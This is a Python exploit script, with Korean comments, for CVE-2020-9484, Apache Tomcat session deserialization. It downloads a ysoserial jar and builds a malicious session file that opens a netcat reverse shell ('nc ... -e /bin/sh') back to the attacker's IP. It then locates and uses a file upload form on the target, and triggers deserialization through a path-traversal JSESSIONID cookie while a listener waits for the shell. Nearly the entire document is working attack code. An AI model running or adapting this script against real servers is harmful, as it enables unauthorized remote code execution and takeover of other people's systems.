# python3
# CVE-2020-9484
# Apache Tomcat Session Deserialization
# ^(7\.0\.(0|[1-9]|[1-9][0-9]|10[0-3])|8\.5\.(0|[1-9]|[1-4][0-9]|5[0-4])|9\.0\.(0|[1-9]|[1-2][0-9]|3[0-4])(-M[1-9])?|10\.0\.0-?M[1-4])$

import os
import subprocess
import requests
import argparse
import time
import socket
from bs4 import BeautifulSoup
from threading import Thread

def nc_listener():
    os.system("nc -lnvp 9001")


def Get_My_IP():
    result = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
    ip = result.stdout.strip().split()[0]
    return ip
attacker_IP = Get_My_IP()



# 페이로드 생성에 필요한 ysoserial-master-d367e379d9-1.jar을 다운받습니다 (56MB)
def download_jar():

    if os.path.exists('ysoserial-master-d367e379d9-1.jar'):
        print("[+] ysoserial.jar exist\n")
        return True
    
    url = 'https://raw.githubusercontent.com/dorkerdevil/CVE-2021-27850_POC/refs/heads/main/ysoserial-master-d367e379d9-1.jar'
    file_name = 'ysoserial-master-d367e379d9-1.jar'

    try:
        print("[+] Downloading ysoserial.jar(56MB), please wait...")

        response = requests.get(url, stream=True)
        response.raise_for_status()

        with open(file_name, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)

        print(f"[+] File downloaded successfully as '{file_name}'\n")
        return True

    except requests.exceptions.RequestException as e:
        print(f"[-] Error downloading the file: {e}")
        return False



# ysoserial을 이용해 악성 cve-2020-9484.session 생성 
# gadget_list=["Groovy1" , "CommonsCollections1" , "CommonsCollections2"]
gadget_list="Groovy1"

def cread_malicious_session():
    try:
        gadget=gadget_list
        os.system(f'''java -jar ysoserial-master-d367e379d9-1.jar {gadget} "nc {attacker_IP} 9001 -e /bin/sh" > cve-2020-9484.session ''')

        if not os.path.exists('cve-2020-9484.session'):
            raise FileNotFoundError
         
        print(f"[+] Payload has been saved to cve-2020-9484.session\n")

    except:
        print("[-] Failed to create the session\n")



#웹 페이지 내 파일업로드 기능을 탐색합니다.
def get_input_form(URL):
    response = requests.get(URL)
    soup = BeautifulSoup(response.text, 'html.parser')

    file_input = soup.find("input", {"type": "file"})

    if file_input:
        form = file_input.find_parent("form")
        action = form.get("action") if form else None
        if action:
            print("[+] File upload input tag found.")
            print(f"[+] Target endpoint : {URL}{action}")

            return URL+action
        else:
            print("[-] Unable to find the action attribute of the form.")
            print(f"[-] Detected Vulnerability : False")
            return False
    else:
        print("[-] File upload input tag not found.")
        print(f"[-] Detected Vulnerability : False")
        return False



# cve-2020-9484.session 파일업로드를 수행합니다.
def file_upload(URL, endpoint):
    file_path = "cve-2020-9484.session"
    
    with open(file_path, "rb") as f:

        files = {'file': ('cve-2020-9484.session', f)}
        full_url = URL + endpoint if endpoint.startswith("/") else endpoint
        upload_response = requests.post(full_url, files=files)
        
        if upload_response.status_code == 200:
            print("[+] The file has been successfully uploaded !\n")
            return True
        else:
            print(f"[-] File upload failed")
            print(f"[-] Detected Vulnerability : False")
            return False


def exploit(URL,FILE):
    if args.RCE:
        listener_thread = Thread(target=nc_listener)
        listener_thread.start()
        

    #PoC
    headers = {'Cookie': f'JSESSIONID=../../../../..{FILE}/cve-2020-9484'}
    
    response = requests.get(URL, headers=headers)

    if response.status_code == 500:
        print(f"[+] Detected Vulnerability : True")
        print("------------------------------------")
        time.sleep(1)
    else:
        print(f"[-] Detected Vulnerability : False")


if __name__ == "__main__":

    print('''=======================================\n            CVE-2020-9484\n Apache Tomcat Session Deserialization\n=======================================''')

    print("[!] It is recommended to manually provide options and test, rather than automating the process")

    parser = argparse.ArgumentParser(description="python3 poc.py -u http://localhost:8080/ -f /usr/local/tomcat/ -rce")
    parser.add_argument("-u", "--URL", required=True, help="Target server URL (e.g., http://localhost:8080/)")
    parser.add_argument("-f", "--FILE", required=False, help="The upload directory path of the target server (e.g., /usr/local/tomcat/)")
    parser.add_argument("-rce","--RCE", required=False, help='remote code execution mode', action='store_true')
    
    args = parser.parse_args()

    URL=args.URL.rstrip("/")
    PATH=args.FILE if args.FILE else "/usr/local/tomcat/uploads/" #테스트 환경 기준 

    if download_jar():
            
        cread_malicious_session() #Groovy1 기준

        endpoint=get_input_form(URL)

        if endpoint:
            
            if file_upload(URL, endpoint):
                print("[+] Target PATH :",PATH)
                exploit(URL, PATH)
